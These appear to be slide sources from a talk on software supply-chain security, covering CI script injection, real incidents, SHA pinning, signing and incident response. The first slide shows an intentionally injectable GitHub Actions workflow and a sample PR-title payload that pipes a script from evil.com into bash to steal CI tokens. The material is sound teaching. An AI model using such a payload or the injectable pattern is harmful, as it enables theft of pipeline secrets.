<!-- PARKED:What you just saw -->


---

<!-- What you just saw -->

<style scoped>
section {
  background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
  justify-content: center;
  padding: 40px 50px;
}
h1 {
  font-size: 2.4em;
  margin-bottom: 0.3em;
  background: linear-gradient(135deg, #f87171 0%, #fbbf24 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}
.explain {
  font-size: 1.05em;
  color: #94a3b8;
  line-height: 1.6;
  margin-bottom: 0.8em;
}
.explain strong { color: #f87171; }
.side-by-side {
  display: grid;
  grid-template-columns: 1fr auto 1fr;
  gap: 0;
  align-items: stretch;
  width: 100%;
}
.code-card {
  background: #0d1117;
  border: 1px solid #30363d;
  border-radius: 10px;
  padding: 18px 22px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.52em;
  line-height: 1.7;
}
.code-card .label {
  text-transform: uppercase;
  letter-spacing: 0.1em;
  font-size: 0.85em;
  margin-bottom: 12px;
  font-weight: 700;
  padding-bottom: 8px;
  border-bottom: 1px solid #21262d;
}
.label-vuln { color: #fbbf24; }
.label-result { color: #f87171; }
.kw { color: #7dd3fc; }
.val { color: #86efac; }
.inject { color: #fbbf24; font-weight: 700; background: rgba(251, 191, 36, 0.1); padding: 2px 4px; border-radius: 3px; }
.output { color: #f87171; }
.comment { color: #8b949e; }
.arrow-col {
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 2em;
  color: #f87171;
  padding: 0 20px;
}
</style>

# What you just saw

<div class="explain">
A single PR with a crafted title exploited a <strong>script injection</strong> vulnerability.
The CI/CD pipeline ran the attacker's code with full access to secrets.
</div>

<div class="side-by-side">
<div class="code-card">
<div class="label label-vuln">📄 The vulnerable workflow</div>
<span class="kw">name:</span> <span class="val">Build PR</span><br>
<span class="kw">on:</span> <span class="val">pull_request</span><br>
<br>
<span class="kw">jobs:</span><br>
&nbsp;&nbsp;<span class="kw">build:</span><br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="kw">runs-on:</span> <span class="val">ubuntu-latest</span><br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="kw">steps:</span><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="kw">- run:</span> <span class="val">echo "Building PR: </span><span class="inject">${{ github.event.pull_request.title }}</span><span class="val">"</span><br>
<br>
<span class="comment"># PR title is controlled by anyone</span><br>
<span class="comment"># Injected directly into the shell</span>
</div>
<div class="arrow-col">→</div>
<div class="code-card">
<div class="label label-result">💥 What the shell actually executed</div>
<span class="val">echo "Building PR: ";</span><br>
<span class="output">curl https://evil.com/steal.sh | bash</span><br>
<br>
<span class="comment"># The attacker's PR title was:</span><br>
<span class="output">"; curl https://evil.com/steal.sh | bash #</span><br>
<br>
<span class="output"># Result:</span><br>
<span class="output">+ exfiltrating GITHUB_TOKEN</span><br>
<span class="output">+ exfiltrating NPM_TOKEN</span><br>
<span class="output">+ exfiltrating AWS_ACCESS_KEY</span><br>
<span class="output">+ secrets posted to attacker</span>
</div>
</div>


<!-- END:What you just saw -->

<!-- PARKED:Tribune and Mapped slides -->


---

<!-- Every Node is an Attack Surface - Newspaper Style Dark -->

<style scoped>
@import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Source+Serif+4:wght@400;600&display=swap');

section {
  padding: 30px 50px;
}
.paper-header {
  text-align: center;
  border-bottom: 3px double #64748b;
  padding-bottom: 10px;
  margin-bottom: 12px;
}
.paper-title {
  font-family: 'Playfair Display', serif;
  font-size: 1.6em;
  font-weight: 900;
  color: #f87171;
  letter-spacing: 2px;
  text-transform: uppercase;
  margin: 0;
}
.paper-date {
  font-family: 'Source Serif 4', serif;
  font-size: 0.65em;
  color: #94a3b8;
  margin-top: 4px;
}
.headline {
  font-family: 'Playfair Display', serif;
  font-size: 1.4em;
  font-weight: 900;
  color: #fbbf24;
  text-align: center;
  line-height: 1.1;
  margin-bottom: 10px;
}
.subhead {
  font-family: 'Source Serif 4', serif;
  font-size: 0.8em;
  color: #94a3b8;
  text-align: center;
  font-style: italic;
  margin-bottom: 15px;
}
.attack-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 15px;
  font-family: 'Source Serif 4', serif;
}
.attack-card {
  background: rgba(30, 41, 59, 0.6);
  border: 1px solid #334155;
  padding: 12px 14px;
  font-size: 0.7em;
  border-radius: 6px;
}
.attack-card h4 {
  font-family: 'Playfair Display', serif;
  font-size: 1.25em;
  margin: 0 0 6px 0;
  color: #f87171;
  border-bottom: 1px solid #334155;
  padding-bottom: 6px;
}
.attack-card p {
  margin: 6px 0;
  line-height: 1.4;
  color: #cbd5e1;
}
.attack-card strong { color: #fbbf24; }
</style>

<div class="paper-header">
  <div class="paper-title">The Supply Chain Tribune</div>
  <div class="paper-date">Special Security Edition - April 2026</div>
</div>
<div class="headline">EVERY NODE IS AN ATTACK SURFACE</div>
<div class="subhead">"From developer to consumer, no link in the chain is safe"</div>
<div class="attack-grid">
  <div class="attack-card">
    <h4>👤 Producer</h4>
    <p>Developers, maintainers, AI assistants creating code</p>
    <p><strong>Threat:</strong> Social engineering, account takeover, AI manipulation</p>
  </div>
  <div class="attack-card">
    <h4>📝 Source</h4>
    <p>Repositories, version control, code review processes</p>
    <p><strong>Threat:</strong> Malicious commits, hidden backdoors</p>
  </div>
  <div class="attack-card">
    <h4>🔨 Build</h4>
    <p>CI/CD pipelines, compilation, testing systems</p>
    <p><strong>Threat:</strong> Script injection, build compromise</p>
  </div>
  <div class="attack-card">
    <h4>📦 Dependencies</h4>
    <p>Libraries, packages, transitive deps</p>
    <p><strong>Threat:</strong> Typosquatting, dependency confusion</p>
  </div>
  <div class="attack-card">
    <h4>🚀 Distribution</h4>
    <p>Registries, CDNs, update mechanisms</p>
    <p><strong>Threat:</strong> Tag hijacking, registry compromise</p>
  </div>
  <div class="attack-card">
    <h4>👥 Consumer</h4>
    <p>Apps, users, production systems</p>
    <p><strong>Threat:</strong> You're the final victim</p>
  </div>
</div>

---

<!-- Real Attacks Mapped - Front Page News Dark -->

<style scoped>
@import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Source+Serif+4:wght@400;600&display=swap');

section {
  padding: 30px 50px;
}
.masthead {
  text-align: center;
  border-bottom: 3px double #64748b;
  padding-bottom: 8px;
  margin-bottom: 10px;
}
.masthead-title {
  font-family: 'Playfair Display', serif;
  font-size: 1.4em;
  font-weight: 900;
  letter-spacing: 3px;
  text-transform: uppercase;
  color: #f87171;
}
.main-headline {
  font-family: 'Playfair Display', serif;
  font-size: 1.5em;
  font-weight: 900;
  text-align: center;
  line-height: 1.05;
  margin-bottom: 15px;
  color: #fbbf24;
}
.news-grid {
  display: grid;
  grid-template-columns: 1fr 1fr 1fr;
  gap: 15px;
  font-family: 'Source Serif 4', serif;
}
.story {
  background: rgba(30, 41, 59, 0.6);
  border: 1px solid #334155;
  padding: 14px 16px;
  border-radius: 6px;
}
.story-head {
  font-family: 'Playfair Display', serif;
  font-size: 1em;
  font-weight: 700;
  color: #f87171;
  margin-bottom: 6px;
  line-height: 1.15;
}
.story-date {
  font-size: 0.65em;
  color: #64748b;
  text-transform: uppercase;
  margin-bottom: 8px;
}
.story-body {
  font-size: 0.68em;
  line-height: 1.5;
  color: #cbd5e1;
}
.story-body strong { color: #fbbf24; }
.chain-map {
  display: flex;
  gap: 4px;
  margin: 8px 0;
  flex-wrap: wrap;
  align-items: center;
}
.chain-node {
  background: #334155;
  color: #e2e8f0;
  padding: 3px 6px;
  font-size: 0.9em;
  border-radius: 3px;
}
.chain-arrow { color: #f87171; font-weight: bold; }
</style>

<div class="masthead">
  <div class="masthead-title">Real Attacks Mapped to the Chain</div>
</div>
<div class="main-headline">THREE ATTACKS, ONE PATTERN: EVERY NODE CAN FALL</div>
<div class="news-grid">
  <div class="story">
    <div class="story-head">XZ UTILS: THE LONG CON</div>
    <div class="story-date">Discovered March 2024</div>
    <div class="story-body">
      2-year social engineering campaign. Attacker "Jia Tan" became trusted maintainer, injected backdoor targeting OpenSSH.
      <div class="chain-map">
        <span class="chain-node">👤 Producer</span>
        <span class="chain-arrow">→</span>
        <span class="chain-node">📝 Source</span>
        <span class="chain-arrow">→</span>
        <span class="chain-node">📦 Deps</span>
        <span class="chain-arrow">→</span>
        <span class="chain-node">👥 Victim</span>
      </div>
      <strong>Entry:</strong> Social engineering to gain commit access
    </div>
  </div>
  <div class="story">
    <div class="story-head">TJ-ACTIONS: TAG HEIST</div>
    <div class="story-date">March 2025</div>
    <div class="story-body">
      Stolen PAT used to rewrite all version tags overnight. 23,000+ repos compromised. CI/CD secrets harvested at scale.
      <div class="chain-map">
        <span class="chain-node">🔨 Build</span>
        <span class="chain-arrow">→</span>
        <span class="chain-node">🚀 Distro</span>
        <span class="chain-arrow">→</span>
        <span class="chain-node">🔑 Secrets</span>
      </div>
      <strong>Entry:</strong> Compromised maintainer token → tag hijacking
    </div>
  </div>
  <div class="story">
    <div class="story-head">SHAI-HULUD: THE WORM</div>
    <div class="story-date">November 2025</div>
    <div class="story-body">
      Script injection via pull_request_target. Stole npm tokens, published 843 malicious packages. Self-propagating worm.
      <div class="chain-map">
        <span class="chain-node">🔨 Build</span>
        <span class="chain-arrow">→</span>
        <span class="chain-node">📦 Deps</span>
        <span class="chain-arrow">→</span>
        <span class="chain-node">🚀 Distro</span>
        <span class="chain-arrow">→</span>
        <span class="chain-node">🔄 Worm</span>
      </div>
      <strong>Entry:</strong> CI/CD input injection → token theft → propagation
    </div>
  </div>
</div>


<!-- END:Tribune and Mapped slides -->

<!-- PARKED:Tags lie SHAs dont -->


---

<!-- The fix -->

<style scoped>
h1 { font-size: 2em; margin-bottom: 1em; }
.compare {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 25px;
}
.side { padding: 25px; border-radius: 12px; }
.bad { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2); }
.good { background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(34, 197, 94, 0.2); }
.side h3 { margin-top: 0; font-size: 1.1em; margin-bottom: 15px; }
.bad h3 { color: #f87171; }
.good h3 { color: #4ade80; }
pre { font-size: 0.6em; }
</style>

# Tags lie. SHAs don't.

<div class="compare">
<div class="side bad">

### Vulnerable

```yaml
# Tag can be moved anytime
- uses: actions/checkout@v4
- uses: tj-actions/changed-files@v45
- uses: aquasecurity/trivy-action@0.28.0
```

The attacker just rewrites where the tag points.

</div>
<div class="side good">

### Safe

```yaml
# SHA is immutable
- uses: actions/checkout@b4ffde65f46...
- uses: tj-actions/changed-files@0e58ed...
- uses: aquasecurity/trivy-action@57a97c...
```

Cannot be changed. Ever. Let Dependabot update.

</div>
</div>


<!-- END:Tags lie SHAs dont -->

<!-- PARKED:Vetting & Dependency Mirror -->


---

<style scoped>
section {
  background: #0d1117;
  display: grid;
  grid-template-columns: 1.2fr 1fr;
  gap: 30px;
  align-items: start;
  padding: 40px;
}
h3 {
  grid-column: 1 / -1;
  color: #4ade80;
  font-size: 1.2em;
  margin: 0 0 0.3em 0;
  font-family: system-ui, sans-serif;
}
.configs {
  display: flex;
  flex-direction: column;
  gap: 12px;
}
.config h4 {
  color: #22c55e;
  font-size: 0.85em;
  margin: 0 0 0.2em 0;
  font-family: system-ui, sans-serif;
}
pre {
  margin: 0;
  font-size: 0.7em;
  line-height: 1.6;
  color: #e6edf3;
  font-family: monospace;
}
.comment { color: #8b949e; }
.keyword { color: #ff7b72; }
.value { color: #7ee787; }
.section-label { color: #79c0ff; }
.sidebar {
  font-family: system-ui, sans-serif;
}
.sidebar h4 {
  color: #4ade80;
  font-size: 0.95em;
  margin: 0 0 0.5em 0;
}
.sidebar ul {
  margin: 0;
  padding-left: 1.2em;
  font-size: 0.8em;
  color: #86efac;
  line-height: 1.8;
}
</style>

<h3>Route all dependencies through your mirror</h3>

<div class="configs">
<div class="config">
<h4>.npmrc (registry scoping)</h4>
<pre><span class="keyword">registry</span>=<span class="value">https://registry.company.com/npm-remote/</span>
<span class="keyword">@company:registry</span>=<span class="value">https://registry.company.com/npm-private/</span></pre>
</div>
<div class="config">
<h4>pip.conf</h4>
<pre><span class="section-label">[global]</span>
<span class="keyword">index-url</span> = <span class="value">https://registry.company.com/pypi-remote/simple/</span></pre>
</div>
</div>

<div class="sidebar">
<h4>🛡️ Vetting controls:</h4>
<ul>
<li>All packages cached & scanned</li>
<li>Known malicious blocked at proxy</li>
<li>New packages quarantined for review</li>
<li>SBOM generated automatically</li>
</ul>
</div>


<!-- END:Vetting & Dependency Mirror -->

<!-- PARKED:Sign & attest - verify everything -->


---

<!-- _class: defense-principle -->

<style scoped>
section {
  background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #1e1b4b 100%);
  color: #e2e8f0;
  padding: 28px 45px;
  font-family: 'Segoe UI', system-ui, sans-serif;
}
h2 {
  font-size: 1.85em;
  color: #c4b5fd;
  margin: 0 0 4px 0;
}
h2 span { color: #a78bfa; font-size: 0.5em; display: block; margin-top: 2px; }
.layout {
  display: grid;
  grid-template-columns: 2fr 3fr;
  gap: 22px;
  height: calc(100% - 60px);
  margin-top: 6px;
}
.image-col {
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
}
.image-col img {
  width: 100%;
  aspect-ratio: 1/1;
  object-fit: cover;
  border-radius: 14px;
  border: 1px solid rgba(167, 139, 250, 0.3);
  box-shadow: 0 0 30px rgba(167, 139, 250, 0.15);
}
.content-col {
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  gap: 10px;
}
.methods {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}
.card {
  background: rgba(167, 139, 250, 0.08);
  border: 1px solid rgba(167, 139, 250, 0.25);
  border-radius: 10px;
  padding: 10px 12px;
  position: relative;
  overflow: hidden;
}
.card::before {
  content: '';
  position: absolute;
  top: 0; left: 0; right: 0;
  height: 2px;
  background: linear-gradient(90deg, #a78bfa, #c4b5fd, #a78bfa);
  opacity: 0.6;
}
.card h3 {
  color: #c4b5fd;
  font-size: 0.78em;
  margin: 0 0 4px 0;
}
.card p {
  font-size: 0.62em;
  color: #cbd5e1;
  margin: 0;
  line-height: 1.35;
}
.extras {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}
.box {
  border-radius: 10px;
  padding: 10px 12px;
}
.box.slsa {
  background: rgba(167, 139, 250, 0.06);
  border: 1px solid rgba(167, 139, 250, 0.2);
}
.box.enforce {
  background: rgba(134, 239, 172, 0.06);
  border: 1px solid rgba(134, 239, 172, 0.3);
}
.box h3 {
  font-size: 0.72em;
  margin: 0 0 3px 0;
}
.box.slsa h3 { color: #c4b5fd; }
.box.enforce h3 { color: #86efac; }
.box p {
  font-size: 0.58em;
  color: #94a3b8;
  margin: 0;
  line-height: 1.35;
}
.tag {
  background: linear-gradient(135deg, rgba(167, 139, 250, 0.12), rgba(139, 92, 246, 0.08));
  border: 1px solid rgba(167, 139, 250, 0.3);
  border-radius: 8px;
  padding: 8px 12px;
  font-size: 0.58em;
  color: #e9d5ff;
  text-align: center;
  line-height: 1.4;
}
</style>

## Sign & attest - verify everything

<div class="layout">
  <div class="image-col">
    <img src="assets/img/sign.png" alt="Sign & attest illustration">
  </div>
  <div class="content-col">
    <div class="methods">
      <div class="card">
        <h3>Sigstore / Cosign</h3>
        <p>Keyless signing for containers and artifacts - uses OIDC identity, no key management overhead</p>
      </div>
      <div class="card">
        <h3>GitHub artifact attestations</h3>
        <p>Cryptographic proof artifacts were built by your workflows - tamper-evident build provenance</p>
      </div>
      <div class="card">
        <h3>npm provenance</h3>
        <p>Link packages to source repo and build via <code>npm publish --provenance</code> - verifiable origin</p>
      </div>
      <div class="card">
        <h3>Verify before trust</h3>
        <p>Check signatures on actions, images, packages - fail pipelines on missing or invalid signatures</p>
      </div>
    </div>
    <div class="extras">
      <div class="box slsa">
        <h3>SLSA framework</h3>
        <p>Supply-chain Levels for Software Artifacts - aim for Level 2+ with hermetic builds and provenance</p>
      </div>
      <div class="box enforce">
        <h3>Enforce at deploy</h3>
        <p>Kyverno / OPA Gatekeeper as admission controller - reject unsigned containers in production</p>
      </div>
    </div>
    <div class="tag">
      ✅ <strong>prevents</strong>: running tampered artifacts &nbsp;|&nbsp; 🔍 <strong>enables</strong>: trace any artifact back to source
    </div>
  </div>
</div>


<!-- END:Sign & attest - verify everything -->

<!-- PARKED:Sign & attest in action -->


---

<!-- _class: defense-example -->

<style scoped>
section {
  background: #0d1117;
  color: #e6edf3;
  padding: 26px 45px;
  font-family: 'Segoe UI', system-ui, sans-serif;
}
h2 {
  font-size: 1.8em;
  color: #c4b5fd;
  margin: 0 0 8px 0;
}
.layout {
  display: grid;
  grid-template-columns: 1.7fr 1fr;
  gap: 16px;
  height: calc(100% - 56px);
}
.code-stack {
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.code-block {
  background: #161b22;
  border: 1px solid #30363d;
  border-radius: 10px;
  padding: 10px 14px;
}
.code-block pre {
  background: transparent;
  border: none;
  padding: 0;
  box-shadow: none;
  margin: 0;
  font-size: 0.52em;
  line-height: 1.45;
  font-family: 'JetBrains Mono', 'Fira Code', monospace;
}
.kw { color: #ff7b72; }
.key { color: #7ee787; }
.val { color: #a5d6ff; }
.comment { color: #8b949e; font-style: italic; }
.hl { color: #d2a8ff; }
.sidebar {
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.sidebar-card {
  background: rgba(167, 139, 250, 0.06);
  border: 1px solid rgba(167, 139, 250, 0.2);
  border-radius: 10px;
  padding: 14px;
}
.sidebar-card h3 {
  font-size: 0.68em;
  color: #c4b5fd;
  margin: 0 0 8px 0;
}
.chain {
  display: flex;
  flex-direction: column;
  gap: 0;
}
.step {
  font-size: 0.56em;
  color: #cbd5e1;
  padding: 5px 8px;
  background: rgba(167, 139, 250, 0.06);
  border-left: 2px solid #a78bfa;
  line-height: 1.4;
}
.step:first-child { border-radius: 6px 6px 0 0; }
.step:last-child { border-radius: 0 0 6px 6px; }
.arrow {
  color: #a78bfa;
  font-size: 0.45em;
  text-align: center;
  padding: 1px 0;
}
.tip {
  background: rgba(134, 239, 172, 0.06);
  border: 1px solid rgba(134, 239, 172, 0.25);
  border-radius: 10px;
  padding: 12px;
}
.tip h3 {
  font-size: 0.65em;
  color: #86efac;
  margin: 0 0 4px 0;
}
.tip p {
  font-size: 0.56em;
  color: #94a3b8;
  margin: 0;
  line-height: 1.35;
}
.tip p strong { color: #fbbf24; }
.tip p code {
  background: rgba(255,255,255,0.06);
  padding: 1px 4px;
  border-radius: 3px;
  font-size: 0.9em;
}
.caution {
  background: rgba(251, 191, 36, 0.06);
  border: 1px solid rgba(251, 191, 36, 0.25);
}
.caution h3 { color: #fbbf24; }
</style>

## Sign & attest in action

<div class="layout">
  <div class="code-stack">
    <div class="code-block">
<pre><span class="comment"># verify npm package provenance</span>
<span class="hl">npm</span> <span class="key">audit signatures</span></pre>
    </div>
    <div class="code-block">
<pre><span class="comment"># verify container signature (keyless via GitHub OIDC)</span>
<span class="hl">cosign</span> <span class="key">verify</span> <span class="kw">--certificate-oidc-issuer</span> \
  <span class="val">https://token.actions.githubusercontent.com</span> \
  <span class="val">ghcr.io/org/image:tag</span></pre>
    </div>
    <div class="code-block">
<pre><span class="comment"># Kyverno - reject unsigned containers in K8s</span>
<span class="kw">apiVersion</span>: <span class="val">kyverno.io/v1</span>
<span class="kw">kind</span>: <span class="val">ClusterPolicy</span>
<span class="kw">metadata</span>:
  <span class="kw">name</span>: <span class="val">require-signed-images</span>
<span class="kw">spec</span>:
  <span class="kw">rules</span>:
  - <span class="kw">name</span>: <span class="val">verify-signature</span>
    <span class="kw">match</span>:
      <span class="kw">any</span>:
      - <span class="kw">resources</span>:
          <span class="kw">kinds</span>: [<span class="val">"Pod"</span>]
    <span class="kw">verifyImages</span>:
    - <span class="kw">imageReferences</span>: [<span class="val">"ghcr.io/org/*"</span>]
      <span class="kw">attestors</span>:
      - <span class="kw">entries</span>:
        - <span class="kw">keyless</span>:
            <span class="kw">issuer</span>: <span class="val">"https://token.actions.githubusercontent.com"</span></pre>
    </div>
  </div>

  <div class="sidebar">
    <div class="sidebar-card">
      <h3>🔗 Full chain</h3>
      <div class="chain">
        <div class="step">🔏 Sign at build time</div>
        <div class="arrow">↓</div>
        <div class="step">📜 Attest provenance</div>
        <div class="arrow">↓</div>
        <div class="step">✅ Verify at deploy</div>
        <div class="arrow">↓</div>
        <div class="step">☸️ Reject unsigned in K8s</div>
      </div>
    </div>
    <div class="tip">
      <h3>💡 Also consider</h3>
      <p>GitHub artifact attestations for non-container builds - same OIDC identity, built-in provenance</p>
    </div>
    <div class="tip caution">
      <h3>⚠️ The devil is in the detail</h3>
      <p>A simple pod restart will <strong>fail</strong> if the signing server or registry is unreachable. Start with <code>Audit</code> mode, plan for outages, and always have a <strong>break-glass</strong> policy.</p>
    </div>
  </div>
</div>


<!-- END:Sign & attest in action -->

<!-- PARKED:Assume Breach DCR -->


---

<!-- Defense: Assume Breach - Detect / Contain / Recover -->

<style scoped>
section {
  background: #0d1117;
  color: #e6edf3;
  padding: 40px 50px;
  font-family: 'Inter', 'Segoe UI', sans-serif;
}
h2 {
  font-size: 1.8em;
  color: #86efac;
  margin: 0 0 20px 0;
  font-weight: 700;
}
.flow {
  display: grid;
  grid-template-columns: 1fr auto 1fr auto 1fr;
  gap: 0;
  align-items: stretch;
  margin-bottom: 16px;
}
.phase {
  border-radius: 10px;
  padding: 16px 16px;
}
.phase-detect {
  background: rgba(251, 191, 36, 0.08);
  border: 1px solid rgba(251, 191, 36, 0.35);
  border-top: 3px solid #fbbf24;
}
.phase-contain {
  background: rgba(248, 113, 113, 0.08);
  border: 1px solid rgba(248, 113, 113, 0.35);
  border-top: 3px solid #f87171;
}
.phase-recover {
  background: rgba(34, 197, 94, 0.08);
  border: 1px solid rgba(34, 197, 94, 0.35);
  border-top: 3px solid #4ade80;
}
.phase h3 {
  font-size: 0.75em;
  margin: 0 0 10px 0;
  font-weight: 700;
}
.phase-detect h3 { color: #fbbf24; }
.phase-contain h3 { color: #f87171; }
.phase-recover h3 { color: #4ade80; }
.phase ul {
  margin: 0;
  padding: 0 0 0 16px;
  font-size: 0.55em;
  line-height: 1.65;
  color: #d1d5db;
}
.phase li { margin-bottom: 3px; }
.phase strong { color: inherit; }
.phase-detect strong { color: #fde68a; }
.phase-contain strong { color: #fca5a5; }
.phase-recover strong { color: #86efac; }
.arrow {
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 1.6em;
  color: #475569;
  padding: 0 8px;
}
.bottom-bar {
  background: linear-gradient(90deg, rgba(251, 191, 36, 0.1) 0%, rgba(248, 113, 113, 0.1) 40%, rgba(34, 197, 94, 0.1) 100%);
  border: 1px solid rgba(148, 163, 184, 0.2);
  border-radius: 8px;
  padding: 12px 16px;
}
.bottom-bar p {
  margin: 0;
  font-size: 0.58em;
  color: #cbd5e1;
  line-height: 1.5;
  text-align: center;
}
.bottom-bar strong { color: #fbbf24; }
.bottom-bar .red { color: #f87171; }
.bottom-bar .green { color: #4ade80; }
</style>

## 🛡️ Assume breach - detect, contain, recover

<div class="flow">
<div class="phase phase-detect">
<h3>1. 🔍 Detect</h3>
<ul>
<li><strong>Preventive controls</strong> triggered?</li>
<li>Monitor <strong>publish patterns</strong></li>
<li>Unexpected <strong>network calls?</strong></li>
<li>Unknown <strong>packages</strong> appearing?</li>
<li>Secrets <strong>accessed</strong> unexpectedly?</li>
</ul>
</div>
<div class="arrow">→</div>
<div class="phase phase-contain">
<h3>2. 🚨 Contain & revoke</h3>
<ul>
<li><strong>Revoke tokens</strong> immediately</li>
<li><strong>Isolate runners</strong> & environments</li>
<li><strong>Block packages</strong> at registry</li>
<li><strong>Disable workflows</strong> under attack</li>
<li>Who has <strong>authority</strong> to act?</li>
</ul>
</div>
<div class="arrow">→</div>
<div class="phase phase-recover">
<h3>3. ✅ Recover</h3>
<ul>
<li><strong>Rebuild clean</strong> from known good</li>
<li><strong>Rotate all creds</strong> - assume leaked</li>
<li>Verify <strong>no persistence</strong> mechanisms</li>
<li><strong>Communicate</strong> to affected users</li>
<li><strong>Post-incident review</strong></li>
</ul>
</div>
</div>

<div class="bottom-bar">
<p><strong>Axios:</strong> detected in 6 min, contained in 3 hrs. <span class="red"><strong>Shai-Hulud:</strong></span> ran for days, 33K secrets stolen. <span class="green">The difference is preparation.</span></p>
</div>


<!-- END:Assume Breach DCR -->

<!-- PARKED:Monday Morning Quick Wins original -->


---

<!-- Monday Morning - Quick Wins (copy) -->

<style scoped>
section {
  background: linear-gradient(135deg, #052e16 0%, #14532d 50%, #0a0a0f 100%);
  color: #e2e8f0;
  padding: 28px 45px;
  font-family: 'Segoe UI', system-ui, sans-serif;
}
h2 {
  font-size: 1.85em;
  color: #86efac;
  margin: 0 0 6px 0;
  font-weight: 700;
}
h2 span {
  display: block;
  font-size: 0.45em;
  color: #94a3b8;
  margin-top: 4px;
  font-weight: 400;
}
.items {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 14px;
  margin-top: 14px;
}
.item {
  background: rgba(34, 197, 94, 0.06);
  border: 1px solid rgba(34, 197, 94, 0.25);
  border-radius: 10px;
  padding: 14px 16px;
  display: flex;
  align-items: flex-start;
  gap: 12px;
}
.num {
  flex-shrink: 0;
  width: 30px;
  height: 30px;
  border-radius: 50%;
  background: linear-gradient(135deg, #22c55e 0%, #4ade80 100%);
  color: #052e16;
  font-size: 0.65em;
  font-weight: 800;
  display: flex;
  align-items: center;
  justify-content: center;
}
.item-text h3 {
  font-size: 0.78em;
  color: #4ade80;
  margin: 0 0 4px 0;
}
.item-text p {
  margin: 0;
  font-size: 0.62em;
  line-height: 1.4;
  color: #d1d5db;
}
.item-text strong { color: #86efac; }
.footer {
  margin-top: 16px;
  background: linear-gradient(90deg, rgba(34, 197, 94, 0.15) 0%, rgba(34, 197, 94, 0.05) 100%);
  border: 1px solid rgba(34, 197, 94, 0.3);
  border-radius: 8px;
  padding: 10px 16px;
  text-align: center;
}
.footer p {
  margin: 0;
  font-size: 0.65em;
  color: #86efac;
  font-weight: 600;
}
</style>

## Before your first coffee ☕
<span>5 things you can do Monday morning - no budget, no approval needed</span>

<div class="items">
  <div class="item">
    <span class="num">1</span>
    <div class="item-text">
      <h3>Run zizmor on your workflows</h3>
      <p>Grab the latest from <strong>github.com/zizmorcore/zizmor/releases</strong>, run <strong>zizmor .github/workflows/</strong> - catches injection, misconfigs, excessive permissions in minutes</p>
    </div>
  </div>
  <div class="item">
    <span class="num">2</span>
    <div class="item-text">
      <h3>Pin your actions to SHA</h3>
      <p>Replace <strong>@v4</strong> with <strong>@sha256</strong> on your most critical workflows. Let Dependabot keep them updated.</p>
    </div>
  </div>
  <div class="item">
    <span class="num">3</span>
    <div class="item-text">
      <h3>Add a cooldown on dependencies</h3>
      <p>Set <strong>minimumReleaseAge: 3 days</strong> in Dependabot or <strong>stabilityDays</strong> in Renovate. One line change.</p>
    </div>
  </div>
  <div class="item">
    <span class="num">4</span>
    <div class="item-text">
      <h3>Drop permissions to read-only</h3>
      <p>Add <strong>permissions: {}</strong> at workflow level. Grant only what each job needs. Blocks token exfiltration.</p>
    </div>
  </div>
  <div class="item">
    <span class="num">5</span>
    <div class="item-text">
      <h3>Check your AI rules files</h3>
      <p>Run <strong>cat -v .cursorrules</strong> and <strong>.github/copilot-instructions.md</strong> - look for hidden Unicode or injected prompts</p>
    </div>
  </div>
</div>

<div class="footer">
<p>These five take less than an hour and block the majority of supply chain attacks we covered today</p>
</div>


<!-- END:Monday Morning Quick Wins original -->

